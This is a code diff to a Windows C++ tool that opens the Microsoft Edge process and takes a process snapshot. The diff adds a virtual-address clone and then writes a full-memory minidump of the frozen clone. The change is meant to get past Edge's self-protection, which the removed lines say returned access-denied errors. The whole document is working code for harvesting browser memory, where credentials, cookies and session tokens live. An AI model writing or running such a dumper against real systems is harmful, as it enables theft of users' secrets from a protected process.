@@ -57,13 +57,13 @@ int main() {
 
 
 
-    // Handle to Edge process with limited perms: PROCESS_VM_READ & PROCESS_DUP_HANDLE
+    // Handle to Edge process with permissions required for VA Cloning
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
-    std::wcout << L"Creating handle to process " << targetPid << L" with permissions: PROCESS_VM_READ & PROCESS_DUP_HANDLE" << std::endl;
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, targetPid);
+    std::wcout << L"Creating handle to process " << targetPid << std::endl;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, targetPid);
     if (!hProcess) {
         SetColor(12); std::cerr << "[-] "; SetColor(7);
-        std::cerr << "OpenProcess failed. Error: " << GetLastError() << " (Check Admin rights)" << std::endl;
+        std::cerr << "OpenProcess failed. Error: " << GetLastError() << std::endl;
         return 1;
     }
     SetColor(10); std::wcout << L"[+] "; SetColor(7);
@@ -73,14 +73,13 @@ int main() {
 
     // Process Snapshot
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
-    std::wcout << L"Attempting Process Snapshot... " << std::endl;
+    std::wcout << L"Attempting Process Snapshot (with VA Clone)... " << std::endl;
     HPSS hSnapshot = NULL;
-    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
+    DWORD flags = PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_THREADS | PSS_CAPTURE_HANDLES;
     DWORD result = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, 0, &hSnapshot);
     if (result != ERROR_SUCCESS) {
         SetColor(12); std::cerr << "[-] "; SetColor(7);
         std::cerr << "Snapshot failed. Error Code: " << result << std::endl;
-        if (result == 5) std::cerr << "[!] Error 5 = Access Denied. Edge's self-protection is blocking this." << std::endl;
         CloseHandle(hProcess);
         return 1;
     }
@@ -88,12 +87,26 @@ int main() {
     std::wcout << L"Process successfully Snapshotted!\n" << std::endl;
 
 
+    HANDLE hFrozenClone = NULL;
+    DWORD queryResult = PssQuerySnapshot(hSnapshot, PSS_QUERY_VA_CLONE_INFORMATION, &hFrozenClone, sizeof(hFrozenClone));
+    
+    if (queryResult != ERROR_SUCCESS || hFrozenClone == NULL) {
+        SetColor(12); std::cerr << "[-] "; SetColor(7);
+        std::cerr << "Failed to query Clone Handle. Error: " << queryResult << std::endl;
+        PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
+        CloseHandle(hProcess);
+        return 1;
+    }
+
+    DWORD clonePid = GetProcessId(hFrozenClone);
+
 
     // DMP file creation
     HANDLE hFile = CreateFileW(dumpName.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         SetColor(12); std::cerr << "[-] "; SetColor(7);
         std::cerr << "File creation failed." << std::endl;
+        CloseHandle(hFrozenClone);
         PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
         CloseHandle(hProcess);
         return 1;
@@ -101,21 +114,22 @@ int main() {
 
 
 
-    // Dump memory into file
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
-    std::wcout << L"Dumping the memory into a file..." << std::endl;
+    std::wcout << L"Dumping the frozen clone memory into a file..." << std::endl;
+    
     BOOL success = MiniDumpWriteDump(
-        hProcess, 
-        targetPid, 
+        hFrozenClone, 
+        clonePid, 
         hFile, 
         MiniDumpWithFullMemory, 
         NULL, 
         NULL, 
         NULL
     );
+
     if (success) {
         SetColor(10); std::cout << "[+] "; SetColor(7);
-        std::cout << "SUCCESS! Dump saved.\n" << std::endl;
+        std::cout << "SUCCESS! Frozen Dump saved.\n" << std::endl;
     } else {
         SetColor(12); std::cerr << "[-] MiniDumpWriteDump failed. Error: " << GetLastError() << std::endl; SetColor(7);
     }
@@ -124,6 +138,7 @@ int main() {
 
     // Cleanup
     CloseHandle(hFile);
+    CloseHandle(hFrozenClone);
     PssFreeSnapshot(GetCurrentProcess(), hSnapshot);
     CloseHandle(hProcess);
     return 0;
